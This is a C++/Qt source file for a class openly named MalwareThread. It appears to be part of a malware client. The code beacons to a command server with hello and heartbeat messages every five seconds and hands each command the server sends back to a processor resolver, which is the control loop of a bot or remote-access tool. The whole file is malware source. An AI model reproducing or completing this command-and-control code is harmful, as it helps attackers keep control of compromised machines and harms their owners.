#include <QEventLoop>
#include <QObject>

#include "../Network/Http/httpserveradapter.h"
#include "../Network/Messages/Client/heartbeatmessage.h"
#include "../Network/Messages/Client/hellomessage.h"
#include "../Processors/processorresolver.h"
#include "malwarethread.h"

using namespace network;
using namespace network::http;
using namespace network::messages::client;
using namespace network::messages::server;
using namespace processors;

namespace threads
{
    MalwareThread::MalwareThread()
    {
        setUpDependencies();
        QObject::connect(serverAdapter_.get(), SIGNAL(receive(std::shared_ptr<network::messages::server::ServerMessage>)), this, SLOT(onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage>)));
        QObject::connect(serverAdapter_.get(), SIGNAL(serverReplied()), this, SLOT(onServerReplied()));
    }

    void MalwareThread::run()
    {
        while(true)
        {
            QEventLoop e;
            QTimer::singleShot(5000, this, SLOT(updateServer()));
            e.exec();
        }

    }

    void MalwareThread::updateServer()
    {
        if(!hasEmittedHello_)
        {
            serverAdapter_->send(HelloMessage());
        }
        else
        {
            serverAdapter_->send(HeartbeatMessage());
        }

        QTimer::singleShot(5000, this, SLOT(updateServer()));
    }

    void MalwareThread::onNewServerMessage(std::shared_ptr<ServerMessage> message)
    {
        std::shared_ptr<MessageProcessorBase> processor = processorResolver_->resolve(message);
        processor.get()->process(message, serverAdapter_);
    }

    void MalwareThread::onServerReplied()
    {
        hasEmittedHello_ = true;
    }

    void MalwareThread::setUpDependencies()
    {
        processorResolver_ = std::make_unique<ProcessorResolver>();
        serverAdapter_ = std::make_unique<HttpServerAdapter>();
    }
}
